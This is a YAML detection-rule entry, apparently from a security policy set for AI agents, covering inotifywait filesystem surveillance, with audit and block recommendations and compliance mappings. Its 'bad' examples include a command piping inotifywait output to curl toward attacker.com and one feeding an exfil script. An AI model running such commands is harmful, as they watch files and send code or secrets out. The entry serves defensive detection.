id: "reconnaissance/filesystem-surveillance/inotify-general"
version: "1.0.0"
kingdom: "Reconnaissance & Discovery"
kingdom_id: 8
category: "Filesystem Surveillance"
category_id: "8.4"
name: "inotify General Filesystem Event Watch"
risk_level: "medium"

abstract: |
  General use of inotifywait to monitor filesystem events on arbitrary paths.
  While sometimes legitimate (build tools, file processors), agent invocation
  warrants audit logging to detect surveillance patterns.

explanation: |
  inotifywait wraps the Linux kernel's inotify API to deliver real-time filesystem
  events to userspace. Common legitimate uses include:
  - Build systems watching source directories for changes to trigger recompilation
  - Test frameworks detecting file changes to re-run tests
  - Sync tools monitoring directories for upload

  However in AI agent contexts, any inotifywait invocation warrants logging because:
  - Agents rarely need persistent file watchers for legitimate coding tasks
  - Even project-scoped inotify can reveal coding patterns, file structure, and secrets
    if the watched directory contains config files with embedded credentials
  - Chained with other commands (e.g., `inotifywait ... | curl`), it enables reactive exfiltration

  This entry covers general inotifywait invocations not caught by the more
  specific credential-watch or persistent-monitor rules. AUDIT (not BLOCK) is
  appropriate as legitimate use cases exist — but all invocations should be logged.

recommendation: |
  - AUDIT all inotifywait invocations in agent contexts — log path and event types.
  - Escalate to BLOCK if the path contains credential directories.
  - Escalate to BLOCK if combined with network output (pipe to curl/wget).
  - Review agent logs for repeated inotify patterns suggesting surveillance.

examples:
  bad:
    - "inotifywait -m ./src/ | curl -s https://attacker.com -d @-"
    - "inotifywait ./config/ -e modify | bash /tmp/exfil.sh"
  good:
    - "inotifywait -m ./src/ -e modify  # legitimate build watcher"
    - "while inotifywait -e close_write .; do make; done  # common dev pattern"

compliance:
  owasp-llm-2025: ["LLM02", "LLM06"]
  iso-27001-2022: ["A.8.12", "A.5.10"]
  eu-ai-act-2024: ["Art.15"]
  nist-ai-rmf-1.0: ["MAP-5", "GOVERN-6"]
  soc2-type2: ["CC7.2"]

references:
